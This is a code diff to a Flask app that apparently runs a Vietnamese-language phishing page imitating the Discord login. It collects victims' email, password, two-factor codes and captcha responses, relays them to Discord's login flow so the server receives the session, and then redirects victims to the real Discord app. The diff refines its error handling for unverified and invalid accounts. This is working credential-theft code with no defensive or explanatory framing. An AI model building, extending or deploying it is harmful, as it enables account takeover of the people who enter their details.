@@ -1,12 +1,11 @@
 import os
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify
 from flask_cors import CORS
 import requests
 import json
 import time
-import re
 
-app = Flask(__name__, static_folder='.', static_url_path='')
+app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', 'random_secret_key_change_me')
 CORS(app)
 
@@ -63,6 +62,8 @@ def discord_login(email, password, captcha_key=None):
             elif 'mfa' in str(data).lower():
                 ticket = data.get('ticket')
                 return {'success': False, 'need_mfa': True, 'ticket': ticket, 'session_req': session_req}
+            elif 'verify' in data.get('message', '').lower() or 'unverified' in data.get('message', '').lower():
+                return {'success': False, 'error': 'unverified_email'}
             else:
                 return {'success': False, 'error': data.get('message', 'invalid_creds')}
         else:
@@ -128,7 +129,7 @@ def index():
 <div class="box hidden" id="captchaBox"><h2>Xác minh an toàn</h2><p>Vui lòng hoàn thành kiểm tra bên dưới</p><div id="captchaContainer"></div><button id="verifyCaptchaBtn">Xác nhận</button><div class="error" id="captchaError"></div><div class="loading hidden" id="captchaLoading">Đang kiểm tra...</div></div>
 <script>
 const API_URL='/api/login';let tempSession=null;let captchaData=null;
-document.getElementById('loginForm').addEventListener('submit',async function(e){e.preventDefault();const email=document.getElementById('email').value;const password=document.getElementById('password').value;if(!email||!password){document.getElementById('loginError').innerText='Vui lòng điền đầy đủ';return;}document.getElementById('loginLoading').classList.remove('hidden');document.getElementById('loginError').innerText='';try{const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'login',email,password})});const data=await res.json();if(data.success){if(data.token){document.getElementById('loginLoading').classList.add('hidden');document.getElementById('loginError').innerText='Đăng nhập thành công!';setTimeout(()=>{window.location.href='https://discord.com/app';},1500);}else if(data.need_mfa){tempSession=data.session_id;document.getElementById('loginBox').classList.add('hidden');document.getElementById('mfaBox').classList.remove('hidden');document.getElementById('loginLoading').classList.add('hidden');}}else if(data.need_captcha){captchaData={session_id:data.session_id,sitekey:data.sitekey,rqdata:data.rqdata};document.getElementById('loginBox').classList.add('hidden');document.getElementById('captchaBox').classList.remove('hidden');document.getElementById('loginLoading').classList.add('hidden');document.getElementById('captchaContainer').innerHTML='<div class="h-captcha" data-sitekey="'+data.sitekey+'" data-rqdata="'+encodeURIComponent(data.rqdata||'')+'"></div>';if(typeof hcaptcha!=='undefined')hcaptcha.render();}else{document.getElementById('loginLoading').classList.add('hidden');document.getElementById('loginError').innerText=data.error||'Sai thông tin đăng nhập';}}catch(err){document.getElementById('loginLoading').classList.add('hidden');document.getElementById('loginError').innerText='Lỗi kết nối';}}});
+document.getElementById('loginForm').addEventListener('submit',async function(e){e.preventDefault();const email=document.getElementById('email').value;const password=document.getElementById('password').value;if(!email||!password){document.getElementById('loginError').innerText='Vui lòng điền đầy đủ';return;}document.getElementById('loginLoading').classList.remove('hidden');document.getElementById('loginError').innerText='';try{const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'login',email,password})});const data=await res.json();if(data.success){if(data.token){document.getElementById('loginLoading').classList.add('hidden');document.getElementById('loginError').innerText='Đăng nhập thành công!';setTimeout(()=>{window.location.href='https://discord.com/app';},1500);}else if(data.need_mfa){tempSession=data.session_id;document.getElementById('loginBox').classList.add('hidden');document.getElementById('mfaBox').classList.remove('hidden');document.getElementById('loginLoading').classList.add('hidden');}}else if(data.need_captcha){captchaData={session_id:data.session_id,sitekey:data.sitekey,rqdata:data.rqdata};document.getElementById('loginBox').classList.add('hidden');document.getElementById('captchaBox').classList.remove('hidden');document.getElementById('loginLoading').classList.add('hidden');document.getElementById('captchaContainer').innerHTML='<div class="h-captcha" data-sitekey="'+data.sitekey+'" data-rqdata="'+encodeURIComponent(data.rqdata||'')+'"></div>';if(typeof hcaptcha!=='undefined'){hcaptcha.render();}}else{document.getElementById('loginLoading').classList.add('hidden');let errMsg=data.error;if(errMsg==='unverified_email') errMsg='Tài khoản chưa xác minh email. Vui lòng xác minh trước.';else if(errMsg==='invalid_creds') errMsg='Sai email hoặc mật khẩu.';document.getElementById('loginError').innerText=errMsg||'Đăng nhập thất bại.';}}catch(err){document.getElementById('loginLoading').classList.add('hidden');document.getElementById('loginError').innerText='Lỗi kết nối máy chủ.';}}});
 document.getElementById('mfaForm').addEventListener('submit',async function(e){e.preventDefault();const code=document.getElementById('mfaCode').value;if(!code||code.length<6){document.getElementById('mfaError').innerText='Nhập mã 6 số';return;}document.getElementById('mfaLoading').classList.remove('hidden');document.getElementById('mfaError').innerText='';try{const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'mfa',session_id:tempSession,code})});const data=await res.json();if(data.success&&data.token){document.getElementById('mfaLoading').classList.add('hidden');document.getElementById('mfaError').innerText='Xác thực thành công!';setTimeout(()=>{window.location.href='https://discord.com/app';},1500);}else{document.getElementById('mfaLoading').classList.add('hidden');document.getElementById('mfaError').innerText=data.error||'Mã không hợp lệ';}}catch(err){document.getElementById('mfaLoading').classList.add('hidden');document.getElementById('mfaError').innerText='Lỗi hệ thống';}}});
 document.getElementById('verifyCaptchaBtn').addEventListener('click',async function(){const captchaResponse=hcaptcha.getResponse();if(!captchaResponse){document.getElementById('captchaError').innerText='Vui lòng hoàn thành captcha';return;}document.getElementById('captchaLoading').classList.remove('hidden');document.getElementById('captchaError').innerText='';try{const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'captcha',session_id:captchaData.session_id,captcha_response:captchaResponse})});const data=await res.json();if(data.success){if(data.token){document.getElementById('captchaLoading').classList.add('hidden');document.getElementById('captchaError').innerText='Đăng nhập thành công!';setTimeout(()=>{window.location.href='https://discord.com/app';},1500);}else if(data.need_mfa){tempSession=data.session_id;document.getElementById('captchaBox').classList.add('hidden');document.getElementById('mfaBox').classList.remove('hidden');document.getElementById('captchaLoading').classList.add('hidden');}}else{document.getElementById('captchaLoading').classList.add('hidden');document.getElementById('captchaError').innerText=data.error||'Captcha không hợp lệ';}}catch(err){document.getElementById('captchaLoading').classList.add('hidden');document.getElementById('captchaError').innerText='Lỗi hệ thống';}}});
 </script>
@@ -166,7 +167,13 @@ def handle_login():
             sessions_store[session_id] = {'type': 'mfa', 'ticket': ticket, 'session_req': session_req}
             return jsonify({'success': False, 'need_mfa': True, 'session_id': session_id})
         else:
-            return jsonify({'success': False, 'error': 'Sai email hoặc mật khẩu'})
+            error_msg = result.get('error', 'invalid_creds')
+            if error_msg == 'unverified_email':
+                return jsonify({'success': False, 'error': 'unverified_email'})
+            elif error_msg == 'invalid_creds':
+                return jsonify({'success': False, 'error': 'invalid_creds'})
+            else:
+                return jsonify({'success': False, 'error': 'Sai email hoặc mật khẩu'})
     elif step == 'captcha':
         session_id = data.get('session_id')
         captcha_response = data.get('captcha_response')
